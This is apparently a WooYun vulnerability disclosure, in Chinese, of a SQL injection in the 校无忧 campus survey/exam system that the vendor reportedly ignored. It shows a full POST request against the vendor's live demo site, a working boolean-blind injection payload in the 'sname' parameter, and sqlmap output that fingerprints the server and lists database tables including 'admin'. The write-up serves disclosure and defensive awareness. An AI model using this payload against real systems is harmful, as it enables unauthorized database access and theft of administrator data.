wybug_title: 某校园系统问卷调查系统POST注入
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2014-11-03：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-02-01：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 校无忧问卷调查系统POST注入 详细说明：  
官方：http://www.xiao5u.com

官方测试站：http://www.Xiao5u.com/Demo/Survey

POST /Demo/Exam/submit.asp HTTP/1.1Host: www.xiao5u.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.xiao5u.com/Demo/Exam/Cookie: CNZZDATA585346=cnzz_eid%3D1481011995-1414123580-%26ntime%3D1414576719; ASPSESSIONIDAQADBABS=AJACPEPDLMMCDHFDDMGIJKLJConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 191sclass=%BB%A4%C0%ED128%B0%E0&sname=asd&sno=12&Blank1=&Blank2=&Blank3=&Blank4=&Blank5=&Answer1=&Answer2=&Submit=%CC%E1%BD%BB%CA%D4%BE%ED&ChoiceCount=6&MChoiceCount=6&BlankCount=6&AnswerCount=3



sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: sname    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sclass=%BB%A4%C0%ED128%B0%E0&sname=asd' AND 6227=6227 AND 'DSPN'='DSPN&sno=12&Blank1=&Blank2=&Blank3=&Blank4=&Blank5=&Answer1=&Answer2=&Submit=%CC%E1%BD%BB%CA%D4%BE%ED&ChoiceCount=6&MChoiceCount=6&BlankCount=6&AnswerCount=3---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft AccessDatabase: Microsoft_Access_masterdb[3 tables]+--------+| admin  || answer || result |+--------+
